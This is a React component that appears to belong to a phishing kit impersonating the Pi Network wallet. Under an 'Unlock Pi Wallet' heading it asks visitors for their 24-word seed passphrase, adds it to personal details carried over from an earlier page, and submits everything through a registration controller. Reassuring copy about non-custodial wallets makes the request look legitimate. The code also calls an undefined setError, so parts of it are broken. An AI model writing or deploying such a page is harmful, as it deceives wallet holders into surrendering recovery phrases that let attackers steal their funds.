import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import Navbar from '../components/nav';
import Image1 from '../img/pi_logo1.png';
import Image2 from '../img/pi_logo2.png';
import Register from '../../../controllers/User_control';
// import axios from 'axios';

const Verify = () => {
    const location = useLocation();
    const getData1 = location.state;
    const navigate = useNavigate();
    const [wallet, setWalletKey] = useState("");

    const {username, full_name, email, subject, message} = getData1

    // const handleSubmit = async (e) => {
    //     e.preventDefault();
    //     console.log(username);
    //     axios.post('http://localhost:3001/verify', {username})
    //     .then(res => {
    //         alert("Created successfully");
    //     }).catch(error => console.log(error));
    // }

    const handleSubmit = async (e) => {

        e.preventDefault();

        const finalData = {...getData1, wallet};

        try {
            // Register the user
            await Register(finalData);

            // Navigate to thank page
            navigate("/thank");

        } catch (error) {

            setError(error.message);
        }

    }

    return ( 
        <form onSubmit={handleSubmit}>
            <Navbar pi1={Image1} pi2={Image2}/>
            <div class="pt-25 pb-12">
                <h1 class="text-gray-800 text-2xl font-bold pb-4">Unlock Pi Wallet</h1>
                <div class="setInputBox">
                    <div>
                        <textarea required name="wallet" value={wallet} onChange={(e) => setWalletKey(e.target.value)}  type="text" placeholder="To proceed, please enter your 24-word passphrase here." class="setInput h-50" />
                    </div>
                </div>
                <div class="flex justify-center items-center mt-5">
                    <button type='submit' class="cursor-pointer inline-block rounded-lg text-center transition ease-in-out duration-300 focus-visible:outline-none focus-visible:outline-2 focus-visible:ring-inset px-10 sm:px-20 py-3 font-semibold bg-blue-900 hover:bg-secondary-400 text-white hover:bg-blue-800 focus-visible:outline-secondary-500">Proceed With Passphrase</button>
                </div>
                <div class="inline-block w-80 sm:w-100 text-gray-800">
                    <h1 class="text-center pt-8 pb-6">
                        As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of password is currently impossible.
                    </h1>
                    <h1 class="text-center">
                        Lost your passphrase? <span class="text-blue-800"><a href="" className="">You can create a new wallet</a></span>, but all your Pi in your previous wallet will be inaccessible.
                    </h1>
                </div>
            </div>
        </form>
     );
}
 
export default Verify;